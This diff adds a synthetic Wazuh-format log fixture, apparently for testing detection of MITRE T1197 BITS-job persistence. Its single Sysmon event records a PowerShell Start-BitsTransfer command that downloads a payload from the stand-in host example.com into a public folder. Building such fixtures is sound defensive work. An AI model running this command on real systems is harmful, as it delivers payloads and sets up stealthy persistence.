@@ -1,0 +1,86 @@
+{
+  "_metadata": {
+    "attack_id": "T1197",
+    "variation": "001",
+    "name": "BITS Jobs for Persistence",
+    "description": "Create Background Intelligent Transfer Service (BITS) job for persistence",
+    "expected_detection": "LOW",
+    "kill_chain_phase": "persistence",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Process Creation: PowerShell Start-BitsTransfer",
+      "sequence": 1,
+      "timestamp": "2026-02-09T15:08:00.000Z",
+      "log": {
+        "rule": {
+          "level": 5,
+          "description": "Sysmon - Event 1: Process creation",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1197"
+            ],
+            "tactic": [
+              "Defense Evasion",
+              "Persistence"
+            ],
+            "technique": [
+              "BITS Jobs"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1709000304.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-09 15:08:00.000",
+              "processGuid": "{12345678-1234-1234-1234-000000304001}",
+              "processId": "28688",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -Command \"Start-BitsTransfer -Source 'http://example.com/payload.txt' -Destination 'C:\\Users\\Public\\bits_payload.txt' -Asynchronous\"",
+              "currentDirectory": "C:\\Windows\\System32\\",
+              "user": "CORP\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A",
+              "parentProcessGuid": "{12345678-1234-1234-1234-000000304000}",
+              "parentProcessId": "1234",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "C:\\Windows\\System32\\cmd.exe"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
